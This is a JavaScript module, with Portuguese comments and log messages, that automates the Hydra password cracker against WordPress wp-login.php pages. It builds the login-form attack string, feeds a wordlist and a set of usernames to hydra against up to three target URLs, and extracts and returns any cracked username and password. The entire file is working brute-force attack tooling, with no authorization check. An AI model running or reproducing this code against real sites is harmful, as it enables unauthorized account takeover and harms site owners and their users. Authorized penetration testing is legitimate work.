import { readFile, writeFile, mkdtemp, rm } from 'fs/promises';
import { join } from 'path';
import { tmpdir } from 'os';
import { spawn } from 'node:child_process';

function whichCmd(cmd) {
  return new Promise((resolve) => {
    const finder = process.platform === 'win32' ? 'where' : 'which';
    const p = spawn(finder, [cmd], { stdio: ['ignore', 'pipe', 'pipe'] });
    p.on('error', () => resolve(false));
    p.on('close', (c) => resolve(c === 0));
  });
}

function parseUsernames(raw, maxUsers = 5) {
  const list = String(raw || '')
    .split(/[\n,\s]+/)
    .map((s) => s.trim())
    .filter((s) => /^[a-zA-Z0-9._@-]{1,64}$/.test(s));
  return [...new Set(list)].slice(0, maxUsers);
}

/**
 * Constrói alvo hydra a partir da URL completa do wp-login.php
 */
function parseWpLoginUrl(loginPageUrl) {
  const u = new URL(String(loginPageUrl).split('#')[0]);
  const ssl = u.protocol === 'https:';
  const port = u.port ? Number(u.port) : ssl ? 443 : 80;
  const path = u.pathname || '/wp-login.php';
  const module = ssl ? 'https-post-form' : 'http-post-form';
  const form = `${path}:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=Incorrect`;
  return { host: u.hostname, port, module, form };
}

/**
 * Hydra http(s)-post-form contra wp-login.php — subset de passwords, poucos users.
 */
export async function runWpHydraBrute({
  wpLoginUrls = [],
  usernamesRaw = '',
  wordlistPath = '',
  maxPasswords = 150,
  log,
  timeoutMs = 240000,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const targets = [...new Set((wpLoginUrls || []).map((x) => String(x || '').trim()).filter(Boolean))].slice(0, 3);
  if (!targets.length) {
    logger('WP brute (hydra): sem URLs wp-login.php — ativa WordPress Focus ou confirma /wp-login.php no alvo.', 'warn');
    return { ok: false, error: 'no-targets', hydra: false };
  }

  const users = parseUsernames(usernamesRaw, 5);
  if (!users.length) {
    logger('WP brute (hydra): indica utilizadores (ex.: admin, editor).', 'warn');
    return { ok: false, error: 'no-users', hydra: false };
  }

  const wl = String(wordlistPath || '').trim();
  if (!wl) {
    logger('WP brute (hydra): indica caminho absoluto da wordlist.', 'warn');
    return { ok: false, error: 'no-wordlist', hydra: false };
  }

  const hydraOk = await whichCmd('hydra');
  if (!hydraOk) {
    logger('WP brute (hydra): hydra não está no PATH.', 'warn');
    return { ok: false, error: 'no-hydra', hydra: false };
  }

  let content;
  try {
    content = await readFile(wl, 'utf8');
  } catch (e) {
    logger(`WP brute (hydra): não consegui ler wordlist — ${e?.message || String(e)}`, 'warn');
    return { ok: false, error: 'read-wordlist', hydra: true };
  }

  const lines = content
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter((l) => l.length > 0 && l.length <= 128);
  const slice = lines.slice(0, Math.min(maxPasswords, 500));
  if (!slice.length) {
    logger('WP brute (hydra): wordlist vazia após filtro.', 'warn');
    return { ok: false, error: 'empty-wordlist', hydra: true };
  }

  const dir = await mkdtemp(join(tmpdir(), 'ghhydwp-'));
  const passFile = join(dir, 'pass.txt');
  const userFile = join(dir, 'users.txt');
  await writeFile(passFile, `${slice.join('\n')}\n`, 'utf8');
  await writeFile(userFile, `${users.join('\n')}\n`, 'utf8');

  const results = [];
  for (const loginUrl of targets) {
    let meta;
    try {
      meta = parseWpLoginUrl(loginUrl);
    } catch (e) {
      logger(`WP brute (hydra): URL inválida ${loginUrl} — ${e?.message || String(e)}`, 'warn');
      continue;
    }

    const outFile = join(dir, `hydra-${meta.host}-${meta.port}.out`);
    const args = [
      '-L',
      userFile,
      '-P',
      passFile,
      '-s',
      String(meta.port),
      '-t',
      '2',
      '-f',
      '-W',
      '3',
      '-o',
      outFile,
      meta.host,
      meta.module,
      meta.form,
    ];

    logger(
      `WP brute (hydra): ${users.length} user(s) × até ${slice.length} passwords · ${meta.module} ${meta.host}:${meta.port}${meta.form.split(':')[0]}`,
      'warn',
    );

    const one = await new Promise((resolve) => {
      const child = spawn('hydra', args, { stdio: ['ignore', 'pipe', 'pipe'] });
      const errBuf = [];
      child.stderr.on('data', (d) => errBuf.push(d));
      const wall = setTimeout(() => {
        try {
          child.kill('SIGTERM');
        } catch {
          /* */
        }
      }, timeoutMs + 5000);
      child.on('error', async (e) => {
        clearTimeout(wall);
        resolve({ error: e.message, outFile });
      });
      child.on('close', async () => {
        clearTimeout(wall);
        let outText = '';
        try {
          outText = await readFile(outFile, 'utf8');
        } catch {
          /* */
        }
        const stderr = Buffer.concat(errBuf).toString('utf8').slice(0, 4000);
        resolve({ outText, stderr, outFile });
      });
    });

    if (one.error) {
      results.push({ loginUrl, error: one.error });
      continue;
    }

    const outText = one.outText || '';
    let loginMatch = outText.match(/login:\s*(\S+)\s+password:\s*(\S+)/i);
    if (!loginMatch) {
      loginMatch = outText.match(/host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(\S+)/i);
    }
    if (loginMatch) {
      logger(`WP brute (hydra): possível credencial — ${loginMatch[1]} / ${loginMatch[2]} @ ${loginUrl}`, 'success');
      results.push({
        loginUrl,
        cracked: true,
        username: loginMatch[1],
        password: loginMatch[2],
        snippet: outText.slice(0, 2000),
      });
      await rm(dir, { recursive: true, force: true }).catch(() => {});
      return {
        ok: true,
        hydra: true,
        cracked: true,
        username: loginMatch[1],
        password: loginMatch[2],
        loginUrl,
        results,
      };
    }

    results.push({
      loginUrl,
      cracked: false,
      snippet: (outText + '\n' + (one.stderr || '')).slice(0, 2500),
    });
  }

  await rm(dir, { recursive: true, force: true }).catch(() => {});
  return {
    ok: true,
    hydra: true,
    cracked: false,
    results,
  };
}
